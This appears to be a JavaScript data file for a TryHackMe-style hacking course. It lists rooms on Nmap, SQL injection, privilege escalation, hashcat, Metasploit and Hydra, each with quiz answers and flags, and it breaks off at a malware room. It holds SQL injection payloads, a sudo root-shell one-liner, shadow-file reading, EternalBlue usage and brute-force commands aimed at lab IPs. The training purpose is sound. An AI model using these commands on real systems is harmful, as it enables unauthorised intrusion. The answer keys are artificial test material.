
// ═══════════════════════════════════════════════════════════
//  ROOMS DATA (TryHackMe-style)
// ═══════════════════════════════════════════════════════════
const ROOMS = [
  {
    id: 'nmap',
    title: 'Nmap: Network Scanning',
    icon: '🔍',
    image: 'cyber_network.png',
    difficulty: 'easy',
    category: ['network','easy'],
    tags: ['Nmap','Recon','Ports'],
    taskCount: 5,
    completedTasks: 3,
    xp: 100,
    users: 284500,
    color: 'emerald',
    description: 'Learn to use Nmap to discover hosts, open ports, and services.',
    tasks: [
      { id: 1, title: 'Task 1: What is Nmap?', done: true, content: '<p class="text-gray-300 text-sm mb-4">Nmap (Network Mapper) is the industry-standard open-source tool for network discovery and security auditing. It uses raw IP packets to determine what hosts are on the network, what services they are running, and what operating systems are in use.</p><pre class="bg-[#0d1117] text-emerald-400 text-xs p-3 rounded-lg border border-[#30363d] mono mb-4">nmap [options] [target]</pre>', q: 'What does the flag -sV do in Nmap?', answer: 'version detection', hint: 'It detects service versions...', points: 10 },
      { id: 2, title: 'Task 2: Scan Types', done: true, content: '<p class="text-gray-300 text-sm mb-4">Nmap supports many scan types. The most common are TCP SYN scan (-sS), TCP Connect scan (-sT), UDP scan (-sU), and Ping scan (-sn).</p><pre class="bg-[#0d1117] text-emerald-400 text-xs p-3 rounded-lg border border-[#30363d] mono mb-4">sudo nmap -sS 10.10.14.2\nnmap -sT 10.10.14.2\nsudo nmap -sU 10.10.14.2</pre>', q: 'Which scan type does NOT complete the TCP 3-way handshake?', answer: 'syn scan', hint: 'Also called a "stealth scan"', points: 15 },
      { id: 3, title: 'Task 3: First Scan', done: true, content: '<p class="text-gray-300 text-sm mb-4">Run your first scan against the target machine. Use the terminal on the right to run:</p><pre class="bg-[#0d1117] text-emerald-400 text-xs p-3 rounded-lg border border-[#30363d] mono mb-4">nmap -sV 10.10.14.2</pre><p class="text-gray-400 text-xs">Wait for the results — Nmap will fingerprint each open service and report its version.</p>', q: 'What version of Apache is running on port 80?', answer: '2.4.49', hint: 'Run nmap -sV 10.10.14.2', points: 20 },
      { id: 4, title: 'Task 4: OS Detection', done: false, content: '<p class="text-gray-300 text-sm mb-4">Nmap can guess the target OS using TCP/IP fingerprinting. Use the -O flag (requires sudo):</p><pre class="bg-[#0d1117] text-emerald-400 text-xs p-3 rounded-lg border border-[#30363d] mono mb-4">sudo nmap -O 10.10.14.2</pre>', q: 'What OS family is the target running?', answer: 'linux', hint: 'Look for "OS details" in the output', points: 25 },
      { id: 5, title: 'Task 5: Script Engine (NSE)', done: false, content: '<p class="text-gray-300 text-sm mb-4">The Nmap Scripting Engine (NSE) allows Nmap to run scripts against discovered services. Try the vuln category to find known vulnerabilities:</p><pre class="bg-[#0d1117] text-emerald-400 text-xs p-3 rounded-lg border border-[#30363d] mono mb-4">nmap --script vuln 10.10.14.2</pre>', q: 'What CVE does the script flag on port 80?', answer: 'CVE-2021-41773', hint: 'This is a famous Apache path traversal vuln', points: 30 }
    ],
    termCommands: {
      'nmap': (parts) => nmapOutput(parts),
      'sudo nmap': (parts) => nmapOutput(parts),
    }
  },
  {
    id: 'sqli',
    title: 'SQL Injection',
    icon: '💉',
    image: 'cyber_glitch.png',
    difficulty: 'medium',
    category: ['web','medium'],
    tags: ['SQLi','Web','Database'],
    taskCount: 5,
    completedTasks: 0,
    xp: 200,
    users: 196000,
    color: 'amber',
    description: 'Understand and exploit SQL injection vulnerabilities in web apps.',
    tasks: [
      { id: 1, title: 'Task 1: What is SQLi?', done: false, content: '<p class="text-gray-300 text-sm mb-4">SQL Injection (SQLi) is a web vulnerability that allows attackers to interfere with the database queries an application makes. This can allow an attacker to view, modify, or delete data.</p><div class="bg-red-900/20 border border-red-500/30 rounded-lg p-3 mb-4"><p class="text-red-300 text-xs font-bold">⚠️ Only test on systems you have permission to test!</p></div>', q: 'What SQL statement is used to retrieve data?', answer: 'select', hint: 'It is a 6-letter SQL keyword', points: 10 },
      { id: 2, title: 'Task 2: In-Band SQLi', done: false, content: '<p class="text-gray-300 text-sm mb-4">In-band SQL Injection is the most common type. The attacker uses the same channel to launch the attack and collect results.</p><pre class="bg-[#0d1117] text-amber-400 text-xs p-3 rounded-lg border border-[#30363d] mono mb-4">\' OR 1=1--\n\' OR \'a\'=\'a\n1; DROP TABLE users--</pre>', q: 'What payload is used in a classic UNION-based SQL injection?', answer: 'union select', hint: 'Combines results from two SELECT queries', points: 15 },
      { id: 3, title: 'Task 3: sqlmap Tool', done: false, content: '<p class="text-gray-300 text-sm mb-4">sqlmap is an open-source tool that automates the detection and exploitation of SQL injection vulnerabilities. Run it against the target login page:</p><pre class="bg-[#0d1117] text-amber-400 text-xs p-3 rounded-lg border border-[#30363d] mono mb-4">sqlmap -u "http://10.10.42.5/login.php?id=1" --dbs</pre>', q: 'What is the name of the target database?', answer: 'cyberspace_users', hint: 'Run sqlmap and look at the output', points: 25 },
      { id: 4, title: 'Task 4: Blind SQLi', done: false, content: '<p class="text-gray-300 text-sm mb-4">Blind SQL injection is where the application does not return the query results in the HTTP response. You infer data based on True/False responses.</p><pre class="bg-[#0d1117] text-amber-400 text-xs p-3 rounded-lg border border-[#30363d] mono mb-4">1\' AND SLEEP(5)--    -- Time-based\n1\' AND 1=1--          -- Boolean-based</pre>', q: 'What type of blind SQLi uses time delays to infer data?', answer: 'time based', hint: 'Think about using SLEEP() or WAITFOR DELAY', points: 30 },
      { id: 5, title: 'Task 5: Exploitation', done: false, content: '<p class="text-gray-300 text-sm mb-4">Now try to dump the users table using sqlmap. This simulates a real penetration test against a vulnerable target.</p><pre class="bg-[#0d1117] text-amber-400 text-xs p-3 rounded-lg border border-[#30363d] mono mb-4">sqlmap -u "http://10.10.42.5/login.php" -D cyberspace_users -T users --dump</pre>', q: 'What is the admin password hash found in the database?', answer: '5f4dcc3b5aa765d61d8327deb882cf99', hint: 'It is an MD5 hash of a very common password...', points: 40 }
    ]
  },
  {
    id: 'wireshark',
    title: 'Wireshark: Traffic Analysis',
    icon: '🦈',
    image: 'cyber_soc.png',
    difficulty: 'medium',
    category: ['soc','network','medium'],
    tags: ['Wireshark','PCAP','Forensics'],
    taskCount: 4,
    completedTasks: 0,
    xp: 150,
    users: 145000,
    color: 'blue',
    description: 'Analyze network traffic captures to identify malicious activity.',
    tasks: [
      { id: 1, title: 'Task 1: Wireshark Basics', done: false, content: '<p class="text-gray-300 text-sm mb-4">Wireshark is the world\'s most widely used network protocol analyzer. It captures and interactively browses network traffic. Use tshark in the terminal for command-line analysis.</p><pre class="bg-[#0d1117] text-blue-400 text-xs p-3 rounded-lg border border-[#30363d] mono mb-4">tshark -r capture.pcap</pre>', q: 'What command opens a pcap file in tshark?', answer: 'tshark -r', hint: 'It\'s the -r flag!', points: 10 },
      { id: 2, title: 'Task 2: Filter Traffic', done: false, content: '<p class="text-gray-300 text-sm mb-4">Use tshark display filters to narrow down traffic. For example, to show only HTTP traffic or traffic from a specific IP:</p><pre class="bg-[#0d1117] text-blue-400 text-xs p-3 rounded-lg border border-[#30363d] mono mb-4">tshark -r capture.pcap -Y "http"\ntshark -r capture.pcap -Y "ip.src==192.168.1.55"</pre>', q: 'What IP address is sending the most traffic?', answer: '192.168.1.55', hint: 'Run tshark -r capture.pcap -q -z conv,ipv4', points: 20 },
      { id: 3, title: 'Task 3: Extract Files', done: false, content: '<p class="text-gray-300 text-sm mb-4">Wireshark can reassemble and export files transmitted over HTTP, FTP, and other protocols. Use tshark to extract objects:</p><pre class="bg-[#0d1117] text-blue-400 text-xs p-3 rounded-lg border border-[#30363d] mono mb-4">tshark -r capture.pcap --export-objects http,./extracted/</pre>', q: 'What file was downloaded by the attacker?', answer: 'malware.exe', hint: 'Look in the extracted HTTP objects', points: 25 },
      { id: 4, title: 'Task 4: C2 Detection', done: false, content: '<p class="text-gray-300 text-sm mb-4">Command and Control (C2) traffic often uses unusual ports or encrypted channels. Look for patterns like beaconing (regular intervals) in the captured traffic.</p><pre class="bg-[#0d1117] text-blue-400 text-xs p-3 rounded-lg border border-[#30363d] mono mb-4">tshark -r capture.pcap -Y "tcp.port==4444"</pre>', q: 'What port is the C2 channel using?', answer: '4444', hint: 'A classic Metasploit default port', points: 35 }
    ]
  },
  {
    id: 'linux',
    title: 'Linux Fundamentals',
    icon: '🐧',
    image: 'cyber_soc.png',
    difficulty: 'easy',
    category: ['linux','easy'],
    tags: ['Linux','Bash','Terminal'],
    taskCount: 6,
    completedTasks: 6,
    xp: 80,
    users: 520000,
    color: 'orange',
    description: 'Master the Linux command line — the foundation of all hacking.',
    tasks: [
      { id: 1, title: 'Task 1: Introduction', done: true, content: '<p class="text-gray-300 text-sm mb-4">Linux is the operating system that powers most servers, IoT devices, and hacking tools. Mastering the terminal is essential.</p>', q: 'What command prints the current directory?', answer: 'pwd', hint: 'Think "print working directory"', points: 5 },
      { id: 2, title: 'Task 2: File System', done: true, content: '<p class="text-gray-300 text-sm mb-4">The Linux filesystem starts at / (root). Key directories: /etc (configs), /home (users), /var (logs), /tmp (temp).</p><pre class="bg-[#0d1117] text-orange-400 text-xs p-3 rounded-lg border border-[#30363d] mono mb-4">ls -la /etc\ncat /etc/passwd</pre>', q: 'Which file contains user account information?', answer: '/etc/passwd', hint: 'It is in the /etc directory', points: 10 },
      { id: 3, title: 'Task 3: Permissions', done: true, content: '<p class="text-gray-300 text-sm mb-4">Linux uses a permission model with read (r=4), write (w=2), and execute (x=1) for user/group/others.</p><pre class="bg-[#0d1117] text-orange-400 text-xs p-3 rounded-lg border border-[#30363d] mono mb-4">chmod 755 script.sh\nls -la script.sh\n# -rwxr-xr-x</pre>', q: 'What chmod value gives full permissions to the owner only?', answer: '700', hint: 'Owner gets 7, group gets 0, others get 0', points: 15 },
      { id: 4, title: 'Task 4: Processes', done: true, content: '<p class="text-gray-300 text-sm mb-4">Manage running processes with ps, kill, and top. Find specific processes with grep.</p><pre class="bg-[#0d1117] text-orange-400 text-xs p-3 rounded-lg border border-[#30363d] mono mb-4">ps aux | grep apache\nkill -9 [PID]</pre>', q: 'What signal number force-kills a process?', answer: '9', hint: 'SIGKILL = 9', points: 10 },
      { id: 5, title: 'Task 5: Networking', done: true, content: '<p class="text-gray-300 text-sm mb-4">Networking commands in Linux: ip, ifconfig, netstat, ss, ping, curl, wget.</p><pre class="bg-[#0d1117] text-orange-400 text-xs p-3 rounded-lg border border-[#30363d] mono mb-4">ip a\nnetstat -tulpn\ncurl -I https://example.com</pre>', q: 'Which command shows active network connections?', answer: 'netstat', hint: 'Or the modern alternative: ss', points: 10 },
      { id: 6, title: 'Task 6: Complete!', done: true, content: '<p class="text-gray-300 text-sm mb-4">🎉 Congratulations! You have completed the Linux Fundamentals room. You now have the foundation to tackle more advanced rooms!</p><div class="bg-emerald-900/20 border border-emerald-500/30 rounded-lg p-4"><p class="text-emerald-400 font-black">+80 XP Earned · Badge Unlocked: 🐧 Linux Pro</p></div>', q: 'What is the name of this room?', answer: 'linux fundamentals', hint: 'The room title!', points: 5 }
    ]
  },
  {
    id: 'privesc',
    title: 'Linux Privilege Escalation',
    icon: '⬆️',
    image: 'cyber_hacker.png',
    difficulty: 'hard',
    category: ['linux','hard'],
    tags: ['PrivEsc','SUID','sudo','Linux'],
    taskCount: 5,
    completedTasks: 1,
    xp: 300,
    users: 132000,
    color: 'red',
    description: 'Escalate from a low-privilege user to root using Linux misconfigurations.',
    tasks: [
      { id: 1, title: 'Task 1: Enumeration', done: true, content: '<p class="text-gray-300 text-sm mb-4">The first step in privilege escalation is thorough enumeration. Run these commands to understand your position on the machine:</p><pre class="bg-[#0d1117] text-red-400 text-xs p-3 rounded-lg border border-[#30363d] mono mb-4">whoami\nid\nuname -a\ncat /etc/os-release</pre>', q: 'What command shows your current user and groups?', answer: 'id', hint: 'A two-letter command', points: 10 },
      { id: 2, title: 'Task 2: sudo Abuse', done: false, content: '<p class="text-gray-300 text-sm mb-4">Always check what commands you can run as root with sudo -l. If you can run a binary as root, you may be able to escalate.</p><pre class="bg-[#0d1117] text-red-400 text-xs p-3 rounded-lg border border-[#30363d] mono mb-4">sudo -l\n# Look for: (root) NOPASSWD: /usr/bin/python3\nsudo python3 -c "import os; os.system(\'/bin/bash\')"</pre>', q: 'Which binary can the user "jane" run as root?', answer: '/usr/bin/python3', hint: 'Run sudo -l in the terminal', points: 25 },
      { id: 3, title: 'Task 3: SUID Binaries', done: false, content: '<p class="text-gray-300 text-sm mb-4">SUID (Set User ID) allows a file to run as the owner. If root owns a SUID binary, it can be abused to gain root. Find them with:</p><pre class="bg-[#0d1117] text-red-400 text-xs p-3 rounded-lg border border-[#30363d] mono mb-4">find / -perm -4000 -type f 2>/dev/null</pre>', q: 'What SUID binary can be used to escalate privileges to root?', answer: '/usr/bin/find', hint: 'Check GTFOBins.github.io for abuse methods', points: 30 },
      { id: 4, title: 'Task 4: Cron Jobs', done: false, content: '<p class="text-gray-300 text-sm mb-4">Cron jobs run at scheduled intervals. If a root-owned cron script is writable by your user, you can inject malicious commands.</p><pre class="bg-[#0d1117] text-red-400 text-xs p-3 rounded-lg border border-[#30363d] mono mb-4">cat /etc/crontab\nls -la /opt/backup.sh</pre>', q: 'How often does the vulnerable cron job run (in minutes)?', answer: '5', hint: 'Look at the */5 field in crontab', points: 25 },
      { id: 5, title: 'Task 5: Rooted!', done: false, content: '<p class="text-gray-300 text-sm mb-4">You now have root access! Read the flag from /root/root.txt to prove you have fully compromised the machine.</p><pre class="bg-[#0d1117] text-red-400 text-xs p-3 rounded-lg border border-[#30363d] mono mb-4">cat /root/root.txt</pre>', q: 'What is the root flag?', answer: 'THM{pr1v3sc_m4st3r}', hint: 'Run cat /root/root.txt', points: 50 }
    ]
  },
  {
    id: 'crypto',
    title: 'Cryptography Basics',
    icon: '🔐',
    image: 'cyber_network.png',
    difficulty: 'easy',
    category: ['crypto','easy'],
    tags: ['Crypto','Hashing','AES','RSA'],
    taskCount: 4,
    completedTasks: 0,
    xp: 120,
    users: 98000,
    color: 'pink',
    description: 'Understand ciphers, hashing, and encryption used in modern security.',
    tasks: [
      { id: 1, title: 'Task 1: Hashing', done: false, content: '<p class="text-gray-300 text-sm mb-4">Hashing converts data into a fixed-size digest. It is one-way (irreversible). Common algorithms: MD5, SHA1, SHA256.</p><pre class="bg-[#0d1117] text-pink-400 text-xs p-3 rounded-lg border border-[#30363d] mono mb-4">echo -n "password" | md5sum\n# 5f4dcc3b5aa765d61d8327deb882cf99</pre>', q: 'What is the MD5 hash of the word "password"?', answer: '5f4dcc3b5aa765d61d8327deb882cf99', hint: 'Run: echo -n "password" | md5sum', points: 15 },
      { id: 2, title: 'Task 2: Symmetric Encryption', done: false, content: '<p class="text-gray-300 text-sm mb-4">Symmetric encryption uses the same key to encrypt and decrypt. AES (Advanced Encryption Standard) is the most common symmetric cipher.</p>', q: 'What does AES stand for?', answer: 'advanced encryption standard', hint: 'AES is a block cipher standard', points: 10 },
      { id: 3, title: 'Task 3: Asymmetric Encryption', done: false, content: '<p class="text-gray-300 text-sm mb-4">Asymmetric encryption uses a public key to encrypt and a private key to decrypt. RSA is the most widely used asymmetric algorithm.</p>', q: 'What key is used to ENCRYPT data in asymmetric cryptography?', answer: 'public key', hint: 'You share one key publicly...', points: 15 },
      { id: 4, title: 'Task 4: Hash Cracking', done: false, content: '<p class="text-gray-300 text-sm mb-4">Cracking hashes involves comparing against wordlists. Use hashcat or john. Try cracking this MD5: 5f4dcc3b5aa765d61d8327deb882cf99</p><pre class="bg-[#0d1117] text-pink-400 text-xs p-3 rounded-lg border border-[#30363d] mono mb-4">hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt</pre>', q: 'What password does the hash 5f4dcc3b5aa765d61d8327deb882cf99 decode to?', answer: 'password', hint: 'It is the most common password in the world!', points: 20 }
    ]
  },
  {
    id: 'hashcat',
    title: 'Advanced Hashcat',
    icon: '🐱',
    image: 'cyber_network.png',
    difficulty: 'hard',
    category: ['crypto','hard'],
    tags: ['Hashcat','Cracking','GPU'],
    taskCount: 4,
    completedTasks: 0,
    xp: 250,
    users: 65000,
    color: 'pink',
    description: 'Master the world\'s fastest password cracker. Learn mask attacks, rule-based cracking, and advanced optimization.',
    tasks: [
      { id: 1, title: 'Task 1: The Basics', done: false, content: '<p class="text-gray-300 text-sm mb-4">Hashcat is an advanced password recovery tool. It supports hundreds of hash formats and relies heavily on GPU acceleration. The core syntax requires the hash mode (<code>-m</code>) and attack mode (<code>-a</code>).</p><pre class="bg-[#0d1117] text-pink-400 text-xs p-3 rounded-lg border border-[#30363d] mono mb-4">hashcat -h | grep NTLM</pre>', q: 'What is the hashcat mode number (-m) for an NTLM hash?', answer: '1000', hint: 'Look it up in the hashcat help menu.', points: 15 },
      { id: 2, title: 'Task 2: Dictionary Attacks', done: false, content: '<p class="text-gray-300 text-sm mb-4">Attack mode 0 (<code>-a 0</code>) is a straight dictionary attack. This is the most common way to crack fast hashes using a wordlist like rockyou.txt.</p><pre class="bg-[#0d1117] text-pink-400 text-xs p-3 rounded-lg border border-[#30363d] mono mb-4">hashcat -m 1000 -a 0 ntlm_hashes.txt rockyou.txt</pre>', q: 'What attack mode number is used for a straight dictionary attack?', answer: '0', hint: 'Read the text above carefully.', points: 20 },
      { id: 3, title: 'Task 3: Mask Attacks', done: false, content: '<p class="text-gray-300 text-sm mb-4">Attack mode 3 (<code>-a 3</code>) allows you to define a specific pattern (mask). For example, to crack a 4-digit PIN, use the digit charset <code>?d</code>.</p><pre class="bg-[#0d1117] text-pink-400 text-xs p-3 rounded-lg border border-[#30363d] mono mb-4">hashcat -m 0 -a 3 hash.txt ?d?d?d?d</pre>', q: 'What mask would you use to crack a 5-letter all-lowercase password?', answer: '?l?l?l?l?l', hint: '?l represents a lowercase letter.', points: 30 },
      { id: 4, title: 'Task 4: Rules', done: false, content: '<p class="text-gray-300 text-sm mb-4">Rules allow you to dynamically modify a wordlist during an attack (e.g., capitalizing the first letter, adding a "1" at the end). The best64 rule is very popular.</p><pre class="bg-[#0d1117] text-pink-400 text-xs p-3 rounded-lg border border-[#30363d] mono mb-4">hashcat -a 0 -r best64.rule hashes.txt words.txt</pre>', q: 'What flag is used to specify a rule file?', answer: '-r', hint: 'Look at the command snippet above.', points: 35 }
    ]
  },
  {
    id: 'metasploit',
    title: 'Metasploit Framework',
    icon: '🚀',
    image: 'cyber_hacker.png',
    difficulty: 'medium',
    category: ['network','medium'],
    tags: ['Metasploit','Exploitation','C2'],
    taskCount: 5,
    completedTasks: 0,
    xp: 220,
    users: 185000,
    color: 'red',
    description: 'Learn to use Metasploit, the world\'s most used penetration testing framework.',
    tasks: [
      { id: 1, title: 'Task 1: Initializing', done: false, content: '<p class="text-gray-300 text-sm mb-4">Metasploit (MSF) is a Ruby-based framework for developing and executing exploit code. Start it via the terminal command <code>msfconsole</code>.</p>', q: 'What command launches the Metasploit interactive console?', answer: 'msfconsole', hint: 'It starts with msf...', points: 10 },
      { id: 2, title: 'Task 2: Finding Exploits', done: false, content: '<p class="text-gray-300 text-sm mb-4">Inside msfconsole, you can search for modules (exploits, payloads, scanners) using the <code>search</code> command.</p><pre class="bg-[#0d1117] text-red-400 text-xs p-3 rounded-lg border border-[#30363d] mono mb-4">msf6 > search eternalblue\nmsf6 > use exploit/windows/smb/ms17_010_eternalblue</pre>', q: 'What command selects a module to configure?', answer: 'use', hint: 'It is a three-letter command.', points: 15 },
      { id: 3, title: 'Task 3: Configuring Options', done: false, content: '<p class="text-gray-300 text-sm mb-4">Once a module is selected, use <code>show options</code> to see what needs to be set. Use <code>set</code> to configure variables like RHOSTS (target) and LHOST (your IP).</p><pre class="bg-[#0d1117] text-red-400 text-xs p-3 rounded-lg border border-[#30363d] mono mb-4">msf6 exploit(...) > set RHOSTS 10.10.14.2\nmsf6 exploit(...) > set LHOST 10.10.10.5</pre>', q: 'What variable represents the target IP address?', answer: 'rhosts', hint: 'R stands for Remote.', points: 20 },
      { id: 4, title: 'Task 4: Payloads', done: false, content: '<p class="text-gray-300 text-sm mb-4">A payload is the code that runs on the target after exploitation. The most famous is Meterpreter, an advanced, dynamically extensible payload.</p><pre class="bg-[#0d1117] text-red-400 text-xs p-3 rounded-lg border border-[#30363d] mono mb-4">msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp</pre>', q: 'What is the name of the advanced Metasploit payload?', answer: 'meterpreter', hint: 'Starts with M, ends with erpreter.', points: 25 },
      { id: 5, title: 'Task 5: Exploitation', done: false, content: '<p class="text-gray-300 text-sm mb-4">Once options and payload are configured, you launch the attack using the <code>exploit</code> or <code>run</code> command.</p><pre class="bg-[#0d1117] text-red-400 text-xs p-3 rounded-lg border border-[#30363d] mono mb-4">msf6 exploit(...) > exploit</pre>', q: 'Besides "exploit", what other command launches the attack?', answer: 'run', hint: 'Three letters, synonym for execute.', points: 30 }
    ]
  },
  {
    id: 'kali',
    title: 'Kali Linux Attacker Machine',
    icon: '🖥️',
    image: 'cyber_soc.png',
    difficulty: 'medium',
    category: ['linux','network','medium'],
    tags: ['Kali','AttackBox','Recon','Tools'],
    taskCount: 6,
    completedTasks: 0,
    xp: 180,
    users: 310000,
    color: 'blue',
    description: 'Set up and use a Kali Linux attacker machine. Learn to navigate the OS, use built-in hacking tools, and launch attacks against lab targets.',
    tasks: [
      { id: 1, title: 'Task 1: Meet Kali Linux', done: false, content: '<p class="text-gray-300 text-sm mb-4">Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing. It comes pre-installed with 600+ security tools including Nmap, Metasploit, Burp Suite, Hashcat, and more.</p><pre class="bg-[#0d1117] text-blue-400 text-xs p-3 rounded-lg border border-[#30363d] mono mb-4">uname -a\ncal\nwhoami</pre><p class="text-gray-400 text-xs mt-2">Use the terminal on the right to try these commands.</p>', q: 'What OS is the attacker machine running?', answer: 'kali linux', hint: 'It is a Debian-based penetration testing OS.', points: 10 },
      { id: 2, title: 'Task 2: Navigating the File System', done: false, content: '<p class="text-gray-300 text-sm mb-4">Kali Linux stores its tools in <code>/usr/bin</code>, wordlists in <code>/usr/share/wordlists</code>, and exploits in <code>/usr/share/exploitdb</code>. The home directory of root is <code>/root</code>.</p><pre class="bg-[#0d1117] text-blue-400 text-xs p-3 rounded-lg border border-[#30363d] mono mb-4">ls /usr/share/wordlists/\ncat /root/.bash_history\necho $PATH</pre>', q: 'Where is the rockyou.txt wordlist located on Kali?', answer: '/usr/share/wordlists', hint: 'Think: where does Kali store shared data?', points: 15 },
      { id: 3, title: 'Task 3: Network Recon', done: false, content: '<p class="text-gray-300 text-sm mb-4">From your Kali attacker machine, always start with reconnaissance. Discover the target with ping, identify your own IP with <code>ip a</code>, and scan with Nmap.</p><pre class="bg-[#0d1117] text-blue-400 text-xs p-3 rounded-lg border border-[#30363d] mono mb-4">ip a\nping -c 4 10.10.14.2\nnmap -sV 10.10.14.2</pre>', q: 'What flag shows your current IP address in Linux?', answer: 'ip a', hint: 'Two letters, then a space, then one letter.', points: 20 },
      { id: 4, title: 'Task 4: Exploitation with Metasploit', done: false, content: '<p class="text-gray-300 text-sm mb-4">Kali ships with Metasploit pre-installed. Launch it with <code>msfconsole</code> and use the EternalBlue exploit against the Windows target.</p><pre class="bg-[#0d1117] text-blue-400 text-xs p-3 rounded-lg border border-[#30363d] mono mb-4">msfconsole\n# Inside MSF:\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 10.10.14.2\nexploit</pre>', q: 'What is the CVE number for the EternalBlue exploit?', answer: 'CVE-2017-0144', hint: 'This vulnerability was used in the WannaCry attack.', points: 30 },
      { id: 5, title: 'Task 5: Password Cracking', done: false, content: '<p class="text-gray-300 text-sm mb-4">After gaining a shell, extract password hashes with <code>hashdump</code> or by reading <code>/etc/shadow</code>. Then crack them on your Kali machine using Hashcat.</p><pre class="bg-[#0d1117] text-blue-400 text-xs p-3 rounded-lg border border-[#30363d] mono mb-4">cat /etc/shadow\nhashcat -m 1800 shadow.txt /usr/share/wordlists/rockyou.txt</pre>', q: 'What Hashcat mode cracks SHA-512 Unix passwords (from /etc/shadow)?', answer: '1800', hint: 'The format is sha512crypt, mode 1800.', points: 30 },
      { id: 6, title: 'Task 6: Reporting', done: false, content: '<p class="text-gray-300 text-sm mb-4">A penetration test is only complete when you write a report. On Kali you can capture screenshots with <code>scrot</code>, save terminal output, and organise your notes in <code>/root/engagements/</code>.</p><pre class="bg-[#0d1117] text-blue-400 text-xs p-3 rounded-lg border border-[#30363d] mono mb-4">mkdir -p /root/engagements/target\nscrot -u screenshot.png\nhistory > terminal_log.txt</pre>', q: 'What command saves your terminal command history to a file?', answer: 'history', hint: 'Read the snippet above carefully.', points: 20 }
    ]
  },
  {
    id: 'hydra',
    title: 'THC-Hydra: Brute Forcing',
    icon: '🐉',
    image: 'cyber_hacker.png',
    difficulty: 'medium',
    category: ['network','brute','medium'],
    tags: ['Hydra','Brute Force','SSH','HTTP'],
    taskCount: 6,
    completedTasks: 0,
    xp: 240,
    users: 178000,
    color: 'red',
    description: 'Master THC-Hydra — the world\'s most powerful online password cracker. Attack SSH, FTP, HTTP login forms, RDP, and 50+ protocols.',
    tasks: [
      { id: 1, title: 'Task 1: What is Hydra?', done: false, content: '<p class="text-gray-300 text-sm mb-4">THC-Hydra is a fast and flexible online password brute-forcing tool developed by van Hauser. It supports over 50 protocols including SSH, FTP, HTTP, HTTPS, SMB, databases, LDAP, and more. Unlike hashcat (offline), Hydra attacks live services over the network.</p><div class="bg-red-900/20 border border-red-500/30 rounded-lg p-3 mb-4"><p class="text-red-300 text-xs font-bold">⚠️ Only attack systems you have explicit permission to test!</p></div><pre class="bg-[#0d1117] text-red-400 text-xs p-3 rounded-lg border border-[#30363d] mono mb-4">hydra -h</pre>', q: 'What is the name of Hydra\'s developer?', answer: 'van hauser', hint: 'Check the GitHub page: vanhauser-thc', points: 10 },
      { id: 2, title: 'Task 2: Brute-Forcing SSH', done: false, content: '<p class="text-gray-300 text-sm mb-4">SSH (port 22) is one of the most common targets. Hydra can attack SSH with a username list and a password wordlist. The <code>-t 4</code> flag limits threads to avoid lockouts.</p><pre class="bg-[#0d1117] text-red-400 text-xs p-3 rounded-lg border border-[#30363d] mono mb-4">hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.14.2\nhydra -L users.txt -P rockyou.txt -t 4 ssh://10.10.14.2\nhydra -l jane -P rockyou.txt -t 4 10.10.14.2 ssh</pre>', q: 'What flag specifies the password wordlist in Hydra?', answer: '-P', hint: 'Capital P for a file full of Passwords', points: 15 },
      { id: 3, title: 'Task 3: HTTP Form Brute Force', done: false, content: '<p class="text-gray-300 text-sm mb-4">HTTP login forms require a special syntax. You must specify the form path, the POST parameters, and the failure string Hydra should look for to know a login failed.</p><pre class="bg-[#0d1117] text-red-400 text-xs p-3 rounded-lg border border-[#30363d] mono mb-4">hydra -l admin -P rockyou.txt 10.10.14.2 http-post-form \n  "/login.php:username=^USER^&password=^PASS^:Invalid credentials"\n\n# For HTTPS:\nhydra -l admin -P rockyou.txt -s 443 10.10.14.2 https-post-form \n  "/login:user=^USER^&pass=^PASS^:Wrong password"</pre>', q: 'What placeholder does Hydra use for the username in HTTP form attacks?', answer: '^USER^', hint: 'Look at the POST parameter syntax above', points: 25 },
      { id: 4, title: 'Task 4: FTP and Other Protocols', done: false, content: '<p class="text-gray-300 text-sm mb-4">Hydra supports many other protocols with a simple syntax change. FTP (port 21), Telnet, RDP, VNC, SMB, and database services are all supported.</p><pre class="bg-[#0d1117] text-red-400 text-xs p-3 rounded-lg border border-[#30363d] mono mb-4"># FTP\nhydra -l admin -P rockyou.txt ftp://10.10.14.2\n\n# RDP (Windows Remote Desktop)\nhydra -l administrator -P rockyou.txt rdp://10.10.14.2\n\n# SMB (Windows shares)\nhydra -l admin -P rockyou.txt smb://10.10.14.2\n\n# MySQL\nhydra -l root -P rockyou.txt mysql://10.10.14.2</pre>', q: 'What protocol does RDP stand for?', answer: 'remote desktop protocol', hint: 'Windows remote management over port 3389', points: 20 },
      { id: 5, title: 'Task 5: Username Spraying', done: false, content: '<p class="text-gray-300 text-sm mb-4">Password spraying tries one password against many usernames to avoid account lockouts. Use <code>-L</code> (capital) for a username list and <code>-p</code> (lowercase) for a single password.</p><pre class="bg-[#0d1117] text-red-400 text-xs p-3 rounded-lg border border-[#30363d] mono mb-4"># Spray one password across many users\nhydra -L users.txt -p Password123! ssh://10.10.14.2\n\n# Create a user list from Nmap results\nnmap -sV --script=smtp-enum-users 10.10.14.2\n\n# Try default creds from a combo file\nhydra -C /usr/share/wordlists/hydra/http-default-accounts.txt http-get://10.10.14.2</pre>', q: 'What flag sets a single password (not a list) in Hydra?', answer: '-p', hint: 'Lowercase p for a single Password', points: 25 },
      { id: 6, title: 'Task 6: Crack the Target!', done: false, content: '<p class="text-gray-300 text-sm mb-4">Now put it all together! The target at 10.10.14.2 has an SSH service running. Use Hydra with the rockyou.txt wordlist to find jane\'s password. Once cracked, SSH into the machine.</p><pre class="bg-[#0d1117] text-red-400 text-xs p-3 rounded-lg border border-[#30363d] mono mb-4">hydra -l jane -P /usr/share/wordlists/rockyou.txt -t 4 ssh://10.10.14.2\n# After cracking:\nssh jane@10.10.14.2</pre><div class="bg-emerald-900/20 border border-emerald-500/30 rounded-lg p-3 mt-3"><p class="text-emerald-400 text-xs font-bold">💡 Tip: Watch the Hydra output in the terminal for [22][ssh] host: results</p></div>', q: 'What is jane\'s password on the target machine?', answer: 'letmein', hint: 'Run hydra -l jane -P rockyou.txt ssh://10.10.14.2 in the terminal', points: 50 }
    ]
  },
  {
    id: 'malware',
    title: 'Malware Analysis',
    icon: '🦠',
    image: 'cyber_glitch.png',
    difficulty: 'hard',
    category: ['malware','forensics','hard'],
    tags: ['Malware','Sandbox','Strings','IDA'],
